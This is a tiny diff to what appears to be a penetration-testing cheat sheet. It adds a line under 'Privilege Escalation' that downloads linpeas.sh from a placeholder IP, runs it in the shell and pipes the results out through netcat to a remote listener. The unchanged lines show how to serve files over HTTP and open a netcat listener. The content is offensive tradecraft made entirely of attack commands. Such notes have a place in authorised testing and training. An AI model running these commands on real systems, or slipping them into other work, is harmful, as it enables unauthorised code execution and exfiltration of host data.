@@ -47,6 +47,7 @@
 
 
 ## Privilege Escalation
+Analysis with external files: curl [IP]:8000/linpeas.sh | sh | nc [IP] [PORT]
 Start HTTP Server: python3 -m http.server [PORT]
 Listen: nc -lvnp [PORT]
 
